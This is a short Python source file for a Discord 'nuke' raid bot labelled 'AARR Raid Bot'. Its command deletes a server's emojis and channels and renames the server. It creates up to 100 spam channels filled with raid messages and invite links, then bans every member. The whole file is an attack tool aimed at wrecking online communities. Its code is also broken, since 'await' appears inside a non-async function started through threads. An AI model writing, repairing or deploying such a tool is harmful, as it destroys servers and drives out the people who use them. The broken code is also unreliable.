import discord
from discord.ext import commands
import threading
import random



intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix="n!",intents=intents)




@client.command()
async def nuke(ctx,guild: discord.Guild):
  for emoji in guild.emojis:
    try:
      await emoji.delete()
    except:
      return
  for channel in guild.channels:
    try:
      await channel.delete()
    except:
      return
  await guild.edit(name="AARRの植民地")
  def create():
    for createchannel in range(100):
      channel = await guild.create_text_channel(f"AARRの植民地{random.choice(range(0,100000000000))}")
      for send in range(10):
        await channel.send(f"raid by AARR\ndiscord.gg/jp\n#AARR Troll\n{random.choice(range(0,100000000000))}")
  for i in range(10):
    threading.Thread(target=create).start()
  for user in guild.members:
    try:
      await user.ban(reason="nuked by AARR Raid Bot")
    except:
      return
  invite = await channel.create_invite(max_age = 0, max_uses = 0)
  await ctx.reply(f"raid完了!\n{invite}")


client.run("TOKEN",bot=True)
